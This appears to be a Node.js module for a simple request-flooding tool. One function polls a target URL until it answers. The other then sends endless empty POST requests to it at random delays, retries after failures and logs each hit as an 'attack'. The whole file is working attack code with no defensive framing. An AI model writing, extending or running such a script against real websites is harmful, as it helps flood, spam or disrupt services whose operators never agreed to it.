const axios = require('axios');
const fileManipulation = require('./fileManipulation');

const startToFindAndAttack = async (url, minDelaySeconds, maxDelaySeconds) => {
  const timeoutSeconds = 1;
  fileManipulation.appendLog(`${process.env.TEXTONSEARCH} ${url}`);

  try {
    await axios.get(url);
    fileManipulation.appendLog(`${process.env.TEXTONFOUND} ${url}`);
    // eslint-disable-next-line no-use-before-define
    postWithRandomDelay(url, minDelaySeconds, maxDelaySeconds);
  } catch {
    setTimeout(
      () => {
        startToFindAndAttack(url, minDelaySeconds, maxDelaySeconds);
      },
      timeoutSeconds * 1000,
    );
  }
};

const postWithRandomDelay = async (url, minDelaySeconds, maxDelaySeconds) => {
  const randomDelay = Math.floor(
    Math.random() * (maxDelaySeconds - minDelaySeconds + 1),
  ) + minDelaySeconds;

  const timeoutId = setTimeout(async () => {
    await axios.post(url, {})
      .then(() => {
        fileManipulation.appendLog(`${process.env.TEXTONATTACK} ${url}`);
        postWithRandomDelay(url, minDelaySeconds, maxDelaySeconds);
      })
      .catch(() => {
        fileManipulation.appendLog(process.env.TEXTONATTACKERROR);
        startToFindAndAttack(url, minDelaySeconds, maxDelaySeconds);
      })
      .finally(() => {
        clearTimeout(timeoutId);
      });
  }, randomDelay * 1000);
};

module.exports = { postWithRandomDelay, startToFindAndAttack };
